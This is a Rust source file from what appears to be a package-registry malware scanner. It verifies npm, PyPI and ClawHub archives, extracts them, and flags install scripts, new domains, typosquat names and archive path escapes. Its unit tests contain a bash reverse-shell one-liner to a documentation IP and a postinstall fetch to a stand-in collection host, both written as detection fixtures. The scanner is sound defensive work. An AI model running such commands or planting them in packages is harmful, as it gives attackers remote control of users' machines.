use std::collections::BTreeSet;
use std::fs;
use std::path::Path;

use anyhow::{bail, Context, Result};
use antidote_core::corpus::Corpus;
use antidote_core::mcp::typosquat_of;
use antidote_core::{rank, scan};
use base64::Engine;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256, Sha512};
use walkdir::WalkDir;

use crate::crawl::{npm, pypi, Item};
use crate::extract;
use crate::state::{Seen, State};

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct Report {
    pub item: Item,
    /// sha256 of the downloaded archive
    pub archive_sha256: Option<String>,
    pub findings: Vec<Hit>,
    pub flags: Vec<Hit>,
    pub domains: Vec<String>,
    pub install_script: bool,
    /// worst severity across findings and flags, or "none"
    pub score: String,
}

/// A rule match or metadata flag. `file_sha256` lets a confirmed report become corpus indicators.
#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct Hit {
    pub severity: String,
    pub id: String,
    pub summary: String,
    pub path: Option<String>,
    pub line: Option<usize>,
    pub evidence: Option<String>,
    pub file_sha256: Option<String>,
}

#[derive(Serialize, Deserialize, Default)]
pub struct AllowRule {
    /// "ecosystem:name"
    pub key: String,
    /// exact version or "*"
    pub version: String,
    /// rule / flag id
    pub id: String,
    #[serde(default)]
    pub reason: String,
}

pub fn load_allowlist(path: &Path) -> Vec<AllowRule> {
    fs::read(path).ok().and_then(|b| serde_json::from_slice(&b).ok()).unwrap_or_default()
}

/// Download, verify, extract and analyze one registry item.
pub fn analyze_remote(c: &Corpus, item: &Item, state: &State, allow: &[AllowRule]) -> Result<Report> {
    let (url, expect): (String, Option<Expect>) = match item.ecosystem.as_str() {
        "npm" => {
            let m = npm::meta(&item.name, &item.version)?;
            (m.tarball, m.integrity.and_then(|i| i.strip_prefix("sha512-").map(|b| Expect::Sha512B64(b.to_string()))))
        }
        "PyPI" => {
            let (u, sha) = pypi::release_file(&item.name, &item.version)?;
            (u, Some(Expect::Sha256Hex(sha)))
        }
        // shortcut: ClawHub's list API has no archive digest; per-file sha256 needs a version-detail call.
        _ => (item.download.clone().context("item has no download url")?, None),
    };
    let mut data = crate::http::get(&url, 50 << 20)?;
    if let Some(e) = expect {
        e.check(&data)?;
    }
    // ClawHub answers GitHub-backed skills with a JSON pointer to a repo archive + subpath
    let mut subpath = None;
    if item.ecosystem == "clawhub" && data.first() == Some(&b'{') {
        let h: serde_json::Value = serde_json::from_slice(&data).context("bad ClawHub handoff")?;
        let archive = h["archiveUrl"].as_str().context("handoff without archiveUrl")?;
        if !(archive.starts_with("https://codeload.github.com/") || archive.starts_with("https://github.com/")) {
            bail!("handoff points outside GitHub: {archive}");
        }
        subpath = h["path"].as_str().map(String::from);
        data = crate::http::get(archive, 50 << 20)?;
    }
    let dir = tempfile::tempdir()?;
    let archive_sha256 = Some(format!("{:x}", Sha256::digest(&data)));
    let mut r = match extract::extract(&data, dir.path()) {
        Ok(_) => {
            // repo archives have one `<repo>-<sha>/` top dir; scan only the skill's folder inside it
            let root = subpath
                .and_then(|p| fs::read_dir(dir.path()).ok()?.filter_map(Result::ok).next().map(|top| top.path().join(p)))
                .filter(|p| p.is_dir())
                .unwrap_or_else(|| dir.path().to_path_buf());
            analyze_dir(c, item, &root, state, allow)
        }
        Err(e) => Report::malformed(item, &e),
    };
    r.archive_sha256 = archive_sha256;
    Ok(r)
}

enum Expect {
    Sha512B64(String),
    Sha256Hex(String),
}

impl Expect {
    fn check(&self, data: &[u8]) -> Result<()> {
        let ok = match self {
            Expect::Sha512B64(b) => base64::engine::general_purpose::STANDARD.encode(Sha512::digest(data)) == *b,
            Expect::Sha256Hex(h) => format!("{:x}", Sha256::digest(data)) == h.to_ascii_lowercase(),
        };
        if !ok {
            bail!("download does not match the registry's digest");
        }
        Ok(())
    }
}

impl Report {
    fn malformed(item: &Item, e: &anyhow::Error) -> Report {
        // paths escaping the extraction dir are an attack signature; other parse failures are just broken archives
        let msg = format!("{e:#}");
        let flag = if msg.contains("escapes the extraction dir") {
            hit("high", "AGT-F-ARCHIVE-ESCAPE", &format!("Archive tries to write outside its folder: {msg}"))
        } else {
            hit("medium", "AGT-F-ARCHIVE", &format!("Archive could not be read: {msg}"))
        };
        let score = flag.severity.clone();
        Report {
            item: item.clone(),
            archive_sha256: None,
            findings: vec![],
            flags: vec![flag],
            domains: vec![],
            install_script: false,
            score,
        }
    }

    pub fn seen(&self) -> Seen {
        Seen { version: self.item.version.clone(), install_script: self.install_script, domains: self.domains.clone(), tools_hash: None }
    }

    pub fn flagged(&self, threshold: &str) -> bool {
        self.score != "none" && rank(&self.score) <= rank(threshold)
    }
}

fn hit(severity: &str, id: &str, summary: &str) -> Hit {
    Hit { severity: severity.into(), id: id.into(), summary: summary.into(), path: None, line: None, evidence: None, file_sha256: None }
}

/// Static analysis of an extracted artifact. Pure apart from reading `dir`, so it is testable offline.
pub fn analyze_dir(c: &Corpus, item: &Item, dir: &Path, state: &State, allow: &[AllowRule]) -> Report {
    let mut raw = Vec::new();
    scan::scan_tree(c, dir, &mut raw);
    let rel = |p: &str| Path::new(p).strip_prefix(dir).map(|r| r.display().to_string()).unwrap_or_else(|_| p.to_string());
    let findings: Vec<Hit> = raw
        .into_iter()
        .map(|f| Hit {
            severity: f.severity.into(),
            file_sha256: fs::read(&f.path).ok().map(|b| format!("{:x}", Sha256::digest(b))),
            path: Some(rel(&f.path)),
            id: f.id,
            summary: f.summary,
            line: f.line,
            evidence: f.evidence,
        })
        .collect();

    let prev = state.seen.get(&item.key());
    let mut flags = Vec::new();

    let scripts = if item.ecosystem == "npm" { npm_install_scripts(dir) } else { vec![] };
    let install_script = !scripts.is_empty();
    if install_script {
        let added = prev.is_some_and(|p| !p.install_script);
        let mut h = if added {
            hit("high", "AGT-F-INSTALL-ADDED", "Install script added in this version (previous version had none)")
        } else {
            hit("medium", "AGT-F-INSTALL", "Runs code at install time")
        };
        h.evidence = Some(scripts.join("; "));
        flags.push(h);
    }

    let domains = domains(dir);
    if let Some(p) = prev {
        let new: Vec<_> = domains.iter().filter(|d| !p.domains.contains(d)).cloned().collect();
        if !new.is_empty() {
            let mut h = hit("low", "AGT-F-NEW-DOMAINS", "Contacts domains the previous version did not");
            h.evidence = Some(new.join(", "));
            flags.push(h);
        }
    }

    if let Some(target) = typosquat_of(&item.name, state.popular.get(&item.ecosystem).map(|v| v.as_slice()).unwrap_or(&[])) {
        flags.push(hit("high", "AGT-F-TYPOSQUAT", &format!("Name is within 2 edits of popular package `{target}`")));
    }

    let allowed = |id: &str| {
        allow.iter().any(|a| a.key == item.key() && (a.version == "*" || a.version == item.version) && a.id == id)
    };
    let findings: Vec<Hit> = findings.into_iter().filter(|h| !allowed(&h.id)).collect();
    let flags: Vec<Hit> = flags.into_iter().filter(|h| !allowed(&h.id)).collect();
    let score = findings
        .iter()
        .chain(&flags)
        .min_by_key(|h| rank(&h.severity))
        .map_or_else(|| "none".to_string(), |h| h.severity.clone());

    Report { item: item.clone(), archive_sha256: None, findings, flags, domains, install_script, score }
}

/// `pre/post/install` scripts from the package.json at the archive root (npm puts it under `package/`).
fn npm_install_scripts(dir: &Path) -> Vec<String> {
    let pj = ["package/package.json", "package.json"].iter().map(|p| dir.join(p)).find(|p| p.exists());
    let Some(v) = pj.and_then(|p| fs::read(p).ok()).and_then(|b| serde_json::from_slice::<serde_json::Value>(&b).ok()) else {
        return vec![];
    };
    ["preinstall", "install", "postinstall"]
        .iter()
        .filter_map(|k| v["scripts"][*k].as_str().map(|s| format!("{k}: {s}")))
        .collect()
}

/// Hosts of every http(s) URL in text files, sorted, capped at 100.
fn domains(dir: &Path) -> Vec<String> {
    let mut out = BTreeSet::new();
    for e in WalkDir::new(dir).into_iter().filter_map(Result::ok).filter(|e| e.file_type().is_file()) {
        let Ok(text) = fs::read(e.path()) else { continue };
        if text.iter().take(8192).any(|b| *b == 0) {
            continue;
        }
        let text = String::from_utf8_lossy(&text);
        for part in text.split("://").skip(1) {
            let host: String = part.chars().take_while(|c| c.is_ascii_alphanumeric() || *c == '.' || *c == '-').collect();
            let host = host.trim_matches('.').to_ascii_lowercase();
            if host.contains('.') && out.len() < 100 {
                out.insert(host);
            }
        }
    }
    out.into_iter().collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn item(name: &str) -> Item {
        Item { source: "npm".into(), ecosystem: "npm".into(), name: name.into(), version: "1.0.1".into(), download: None }
    }

    #[test]
    fn flags_install_script_and_new_domains() {
        let c = antidote_core::corpus::load().unwrap();
        let d = tempfile::tempdir().unwrap();
        fs::create_dir_all(d.path().join("package")).unwrap();
        fs::write(d.path().join("package/package.json"), r#"{"name":"x","scripts":{"postinstall":"node setup.js"}}"#).unwrap();
        fs::write(d.path().join("package/setup.js"), "fetch('https://collect.example.net/x')").unwrap();

        let mut state = State::default();
        state.seen.insert("npm:x-pkg".into(), Seen { version: "1.0.0".into(), install_script: false, domains: vec![], tools_hash: None });
        let r = analyze_dir(&c, &item("x-pkg"), d.path(), &state, &[]);
        let ids: Vec<_> = r.flags.iter().map(|h| h.id.as_str()).collect();
        assert_eq!(ids, ["AGT-F-INSTALL-ADDED", "AGT-F-NEW-DOMAINS"]);
        assert_eq!(r.domains, ["collect.example.net"]);
        assert_eq!(r.score, "high");
        assert!(r.flagged("high"));

        let allow = vec![AllowRule { key: "npm:x-pkg".into(), version: "*".into(), id: "AGT-F-INSTALL-ADDED".into(), reason: String::new() }];
        let r = analyze_dir(&c, &item("x-pkg"), d.path(), &state, &allow);
        assert_eq!(r.score, "low");
        assert!(!r.flagged("high"));
    }

    #[test]
    fn rule_hits_carry_file_hash() {
        let c = antidote_core::corpus::load().unwrap();
        let d = tempfile::tempdir().unwrap();
        fs::write(d.path().join("run.sh"), "bash -i >& /dev/tcp/192.0.2.1/4444 0>&1\n").unwrap();
        let r = analyze_dir(&c, &item("benign-name"), d.path(), &State::default(), &[]);
        assert_eq!(r.score, "critical");
        assert_eq!(r.findings[0].path.as_deref(), Some("run.sh"));
        assert_eq!(r.findings[0].file_sha256.as_ref().unwrap().len(), 64);
    }

    #[test]
    fn clean_package_is_not_flagged() {
        let c = antidote_core::corpus::load().unwrap();
        let d = tempfile::tempdir().unwrap();
        fs::write(d.path().join("index.js"), "module.exports = (a, b) => a + b;\n").unwrap();
        let r = analyze_dir(&c, &item("adder-lib"), d.path(), &State::default(), &[]);
        assert_eq!(r.score, "none");
    }
}
